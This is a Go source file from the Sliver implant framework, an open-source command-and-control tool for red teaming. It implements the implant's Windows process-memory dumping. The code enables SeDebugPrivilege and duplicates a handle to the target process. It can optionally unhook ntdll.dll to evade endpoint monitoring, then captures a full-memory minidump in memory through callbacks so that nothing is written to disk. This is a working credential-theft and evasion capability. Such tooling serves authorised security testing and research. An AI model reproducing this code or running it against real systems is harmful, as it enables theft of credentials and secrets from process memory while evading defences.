package procdump

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"runtime"

	//{{if .Config.Debug}}
	"log"
	//{{end}}

	// {{if .Config.Evasion}}
	// {{if eq .Config.GOARCH "amd64"}}
	"github.com/bishopfox/sliver/implant/sliver/evasion"
	// {{end}}
	// {{end}}

	"bytes"
	"encoding/binary"
	"unsafe"

	"github.com/bishopfox/sliver/implant/sliver/priv"
	"github.com/bishopfox/sliver/implant/sliver/syscalls"
	"golang.org/x/sys/windows"
)

const (
	ModuleCallback = iota
	ThreadCallback
	ThreadExCallback
	IncludeThreadCallback
	IncludeModuleCallback
	MemoryCallback
	CancelCallback
	WriteKernelMinidumpCallback
	KernelMinidumpStatusCallback
	RemoveMemoryCallback
	IncludeVmRegionCallback
	IoStartCallback
	IoWriteAllCallback
	IoFinishCallback
	ReadMemoryFailureCallback
	SecondaryFlagsCallback
	IsProcessSnapshotCallback
	VmStartCallback
	VmQueryCallback
	VmPreReadCallback
	VmPostReadCallback

	S_FALSE                = 1
	S_OK                   = 0
	TRUE                   = 1
	FALSE                  = 0
	MiniDumpWithFullMemory = 0x00000002
)

type WindowsDump struct {
	data []byte
}

type outDump struct {
	chunks []dumpChunk
}

type dumpChunk struct {
	data  []byte
	start uint64
}

func (o *outDump) reassemble() []byte {
	var lastChunk dumpChunk
	// Find chunk that has the highest offset
	for _, chunk := range o.chunks {
		if chunk.start > lastChunk.start {
			lastChunk = chunk
		}
	}
	output := make([]byte, lastChunk.start+uint64(len(lastChunk.data)))
	// Reassemble
	for _, chunk := range o.chunks {
		copy(output[chunk.start:], chunk.data)
	}
	return output
}

func (d *WindowsDump) Data() []byte {
	return d.data
}

func dumpProcess(pid int32) (ProcessDump, error) {
	var lpTargetHandle windows.Handle
	res := &WindowsDump{}
	if err := priv.SePrivEnable("SeDebugPrivilege"); err != nil {
		return res, err
	}

	hProc, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, false, uint32(pid))
	currentProcHandle, err := windows.GetCurrentProcess()
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("GetCurrentProcess failed")
		// {{end}}
		return res, err
	}
	err = windows.DuplicateHandle(hProc, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("DuplicateHandle failed")
		// {{end}}
		return res, err
	}

	if hProc != 0 {
		return minidump(uint32(pid), lpTargetHandle)
	}
	return res, fmt.Errorf("{{if .Config.Debug}}Could not dump process memory{{end}}")
}

func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
	var err error
	dump := &WindowsDump{}
	// {{if eq .Config.GOARCH "amd64"}}
	// Hotfix for #66 - need to dig deeper
	// {{if .Config.Evasion}}
	err = evasion.RefreshPE(`c:\windows\system32\ntdll.dll`)
	if err != nil {
		//{{if .Config.Debug}}
		log.Println("RefreshPE failed:", err)
		//{{end}}
		return dump, err
	}
	// {{end}}
	// {{end}}

	outData := outDump{
		chunks: make([]dumpChunk, 0),
	}

	callbackInfo := MiniDumpCallbackInformation{
		CallbackRoutine: windows.NewCallback(minidumpCallback),
		CallbackParam:   uintptr(unsafe.Pointer(&outData)),
	}

	err = syscalls.MiniDumpWriteDump(
		proc,
		pid,
		0,
		MiniDumpWithFullMemory,
		0,
		0,
		uintptr(unsafe.Pointer(&callbackInfo)),
	)

	if err != nil {
		return dump, err
	}
	dump.data = outData.reassemble()
	return dump, nil
}

type MiniDumpIOCallback struct {
	Handle      uintptr
	Offset      uint64
	Buffer      uintptr
	BufferBytes uint32
}

type MiniDumpCallbackInput struct {
	ProcessId     uint32
	ProcessHandle uintptr
	CallbackType  uint32
	Io            MiniDumpIOCallback
}

type MiniDumpCallbackOutput struct {
	Status int32
}

type MiniDumpCallbackInformation struct {
	CallbackRoutine uintptr
	CallbackParam   uintptr
}

func getCallbackInput(callbackInputPtr uintptr) (*MiniDumpCallbackInput, error) {
	callbackInput := MiniDumpCallbackInput{}
	ioCallback := MiniDumpIOCallback{}
	bufferSize := unsafe.Sizeof(callbackInput)
	data := unsafe.Slice((*byte)(unsafe.Pointer(callbackInputPtr)), int(bufferSize))
	buffReader := bytes.NewReader(data)
	err := binary.Read(buffReader, binary.LittleEndian, &callbackInput.ProcessId)
	if err != nil {
		return nil, err
	}
	var procHandle uint64
	err = binary.Read(buffReader, binary.LittleEndian, &procHandle)
	if err != nil {
		return nil, err
	}
	callbackInput.ProcessHandle = uintptr(procHandle)
	err = binary.Read(buffReader, binary.LittleEndian, &callbackInput.CallbackType)
	if err != nil {
		return nil, err
	}
	var ioHandle uint64
	err = binary.Read(buffReader, binary.LittleEndian, &ioHandle)
	if err != nil {
		return nil, err
	}
	ioCallback.Handle = uintptr(ioHandle)
	err = binary.Read(buffReader, binary.LittleEndian, &ioCallback.Offset)
	if err != nil {
		return nil, err
	}
	var ioBuffer uint64
	err = binary.Read(buffReader, binary.LittleEndian, &ioBuffer)
	if err != nil {
		return nil, err
	}
	ioCallback.Buffer = uintptr(ioBuffer)
	err = binary.Read(buffReader, binary.LittleEndian, &ioCallback.BufferBytes)
	if err != nil {
		return nil, err
	}
	callbackInput.Io = ioCallback
	return &callbackInput, nil
}

func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackOutput *MiniDumpCallbackOutput) uintptr {
	callbackInput, err := getCallbackInput(callbackInputPtr)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("getCallbackInput failed: %s\n", err.Error())
		// {{end}}
		return FALSE
	}
	// {{if .Config.Debug}}
	log.Printf("minidumpCallback called: %v\n", callbackInput.CallbackType)
	// {{end}}
	switch callbackInput.CallbackType {
	case IoStartCallback:
		callbackOutput.Status = S_FALSE
	case IoWriteAllCallback:
		callbackOutput.Status = S_OK
		outData := (*outDump)(unsafe.Pointer(callbackParam))
		liveSliceSize := int(callbackInput.Io.BufferBytes)
		liveSlice := unsafe.Slice((*byte)(unsafe.Pointer(callbackInput.Io.Buffer)), liveSliceSize)
		// deep copy
		newChunk := dumpChunk{
			data:  make([]byte, liveSliceSize),
			start: callbackInput.Io.Offset,
		}
		copy(newChunk.data, liveSlice)
		outData.chunks = append(outData.chunks, newChunk)
		runtime.KeepAlive(outData)
	case IoFinishCallback:
		callbackOutput.Status = S_OK
	default:
		return TRUE
	}
	return TRUE
}
